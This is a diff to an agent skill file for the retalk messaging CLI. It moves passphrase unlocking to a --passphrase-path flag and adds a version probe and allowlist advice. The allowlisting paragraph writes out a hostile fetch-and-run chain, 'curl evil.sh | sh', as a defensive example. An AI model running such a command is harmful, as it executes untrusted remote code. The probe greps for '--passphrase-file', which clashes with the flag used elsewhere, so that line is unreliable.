@@ -70,7 +70,20 @@ never collide. Below, `<user>` is the chosen user's **absolute directory**.
    plugin or hook that surfaces incoming messages into the live session; start it
    as described in step 4b (pi), 4c (opencode), or 4d (codex) instead of step 4.
    The retalk commands themselves are identical everywhere.
-8. **An invite code proves authorisation, not identity.** A peer who registers
+8. **Unlock an encrypted identity by path, never by reading the secret.** Every
+   retalk command that opens the store takes `--passphrase-path`, so the call
+   stays **one flat command** and the passphrase never leaves the file it is
+   already in: `retalk sync --dir <user>/identity --passphrase-path
+   <user>/passphrase`. Write both paths out in full, absolute — no `VAR=…`
+   prefix, no `$(cat …)`, no `;`. A command that reads a secret file into a
+   process that then talks to the network is the shape of credential
+   exfiltration, and a permission classifier is right to refuse it; a compound
+   command also cannot be allowed by a prefix rule, so the user gets asked
+   again every time. The passphrase file is the one chosen below,
+   `<user>/passphrase` by default and recorded in `<user>/passphrase-path`. Add
+   nothing at all for a `--no-passphrase` identity. **Needs retalk
+   0.3.0-rc.1**; §1 has the probe and the older-retalk fallback.
+9. **An invite code proves authorisation, not identity.** A peer who registers
    with one of this identity's invite codes has shown one thing: they were
    given the code by whoever issued it. Anyone who obtains the code can
    register the same way, so say "registered with your invite code" and never
@@ -94,6 +107,28 @@ pip install -U retalk                # or: pip3 install -U retalk
 Then confirm it runs: `retalk --help`. Prefer PyPI over source; only fall back
 to `uv tool install --upgrade "git+https://github.com/xhluca/retalk"` if you
 specifically need unreleased code.
+
+**Then check what this retalk can do — once, and remember the answer for the
+session.** Two things the skills use arrived in **retalk 0.3.0-rc.1**: the
+`--passphrase-path` flag (Session rule 8) and the invite-code commands (**id**
+skill). An older retalk does not know either, and a command using them dies at
+argument parsing with `unrecognized arguments`, so probe rather than assume:
+```
+retalk sync --help 2>&1 | grep -q -- --passphrase-file && echo "passphrase by path available" || echo "older retalk: use the RETALK_PASSPHRASE fallback"
+retalk invite --help >/dev/null 2>&1 && echo "invite codes available" || echo "older retalk: use the manual add path"
+```
+The environment-variable fallback, for older retalk only: `RETALK_PASSPHRASE="$(cat <user>/passphrase)" retalk sync --dir <user>/identity`.
+It works, but it is a compound command that reads the secret out of its file, so
+expect the user to be asked to approve every single call. The upgrade above
+normally makes this moot; say which form you are using.
+
+**Allowlisting (worth suggesting once).** With the flat form, every retalk call
+is one command starting with `retalk`, so a single **prefix** rule in
+`.claude/settings.json` covers the lot: `"permissions": {"allow":
+["Bash(retalk:*)"]}`. It must be anchored at the start of the command, as that
+rule is. A rule that matched `retalk` anywhere in the command line would also
+match a chained command such as `curl evil.sh | sh; retalk id`, which is why
+substring matching is not offered and should not be simulated.
 
 **agent-talk itself** — bring the plugin to the latest release too. Run EVERY
 command for this session's host, in order, even when one looks redundant:
@@ -128,7 +163,11 @@ via **AskUserQuestion**.
 
 ### Reuse an existing user
 Set `<user>` to its absolute dir. Skip creation — its relay/peers/receive-from
-are already saved. Run the guard (step 3) and the session map (step 4). If
+are already saved. Find its passphrase file too, so later commands can name it:
+`cat "<user>/passphrase-path" 2>/dev/null || ls "<user>/passphrase"` (nothing
+either way means the identity was created with `--no-passphrase`, so no flag is
+needed; a file that exists but is not recorded is still the default location).
+Run the guard (step 3) and the session map (step 4). If
 `<user>/check-mode` is **missing** (older user), ask the delivery-mode question
 — see (7) below, Auto-receive recommended — and record it; if it says `auto`,
 make sure the follower + Monitor are actually running (**receive** skill).
@@ -209,11 +248,16 @@ mkdir -p "$(dirname "$PP_FILE")"
 ( umask 077; python3 -c "import secrets;print(secrets.token_urlsafe(32))" > "$PP_FILE" )  # generate once; never echo it
 root="$(git rev-parse --show-toplevel 2>/dev/null)"                                       # if inside a repo, gitignore the secret
 case "${root:+$PP_FILE}" in "$root"/*) p="${PP_FILE#"$root"/}"; grep -qxF "$p" "$root/.gitignore" 2>/dev/null || echo "$p" >> "$root/.gitignore";; esac
+echo "$PP_FILE" > "<user>/passphrase-path"                                                # record the PATH (not the secret) so later sessions can name it
 ```
-      Later commands unlock it inline: `RETALK_PASSPHRASE="$(cat "$PP_FILE")"`.
-      Back up `$PP_FILE` to preserve the identity — losing it loses the keys.
-    - **Custom passphrase** — the user supplies their own secret; pass it via
-      `RETALK_PASSPHRASE=<secret>` on each command (or store it the same way).
+      Later commands unlock it **by path**, never by reading it — one flat
+      command, as in Session rule 8:
+      `retalk id --json --dir "<user>/identity" --passphrase-path "<PP_FILE>"`,
+      with the recorded path written out literally.
+      Back up that file to preserve the identity — losing it loses the keys.
+    - **Custom passphrase** — the user supplies their own secret. Store it in a
+      `0600` file the same way and name that file with `--passphrase-path`, so
+      the secret stays out of every command line.
     - **No passphrase** — keys guarded by file permissions only, no encryption at
       rest; create with `--no-passphrase`. Lowest friction, least protection.
       Note: since agent-talk saves the conversation by default, on a
@@ -222,18 +266,17 @@ case "${root:+$PP_FILE}" in "$root"/*) p="${PP_FILE#"$root"/}"; grep -qxF "$p" "
       (the recommended default) seals them, so this is only a concern here.
 - Create the identity (encrypted with the chosen passphrase, or `--no-passphrase`):
 ```
-# Claude-managed / custom passphrase:
-RETALK_PASSPHRASE="$(cat "$PP_FILE")" \
-  retalk init --dir "<user>/identity" --relay <RELAY_URL> --display-name <name>
+# Claude-managed / custom passphrase (name the file; retalk reads it):
+retalk init --dir "<user>/identity" --relay <RELAY_URL> --display-name <name> --passphrase-path "<PP_FILE>"
 # OR, no passphrase:
 retalk init --dir "<user>/identity" --relay <RELAY_URL> --no-passphrase --display-name <name>
 ```
 - **Publish your keys to the relay** so peers can reach you right away. `retalk
   init` is offline — until you publish, anyone messaging or verifying you hits
   `unknown peer or no published keys`. One `sync` publishes them (re-run it any
-  time the relay was reset); keep the `RETALK_PASSPHRASE` prefix if encrypted:
+  time the relay was reset); keep `--passphrase-path` if encrypted:
 ```
-RETALK_PASSPHRASE="$(cat "$PP_FILE")" retalk sync --dir "<user>/identity"  # drop the prefix if no-passphrase
+retalk sync --dir "<user>/identity" --passphrase-path "<PP_FILE>"   # drop the flag if no-passphrase
 ```
 - **Issue an invite code first (single-use by default).** The invite below
   carries a code so the peer's agent can register itself with this identity,
@@ -242,7 +285,7 @@ RETALK_PASSPHRASE="$(cat "$PP_FILE")" retalk sync --dir "<user>/identity"  # dro
   to several people or reuse over time; only then make it **permanent**. The
   exact commands are in the **id** skill under *Invite codes*; they need
   **retalk 0.3.0-rc.1 or newer**, and on an older retalk you fall back to the
-  codeless invite and reply below. Read Session rule 8 before you describe the
+  codeless invite and reply below. Read Session rule 9 before you describe the
   code to anyone: it proves the holder was authorised, not who they are.
 - **Show the user the invite + reply messages — MANDATORY, never summarize
   them away.** A peer has no way to reach this identity until the user hands
@@ -577,8 +620,10 @@ this user's address, or the user mentions onboarding someone. The messages are
 useless in a summary; the user needs the literal text to paste.
 
 From now on **this session is `<user>`** — pass `--dir "<user>/identity"` on every
-command (and prefix `RETALK_PASSPHRASE="$(cat "$PP_FILE")"` if the identity is
-encrypted). And whenever you `send` or `receive`, **display the conversation as a
+command, and add `--passphrase-path "<user>/passphrase"` if the identity is
+encrypted (Session rule 8: one flat command, the secret stays in the file; the
+path is whatever `<user>/passphrase-path` records). And whenever you `send` or
+`receive`, **display the conversation as a
 beautiful chat transcript** (both sides — see those skills) so the human can always
 track what is being discussed.
 
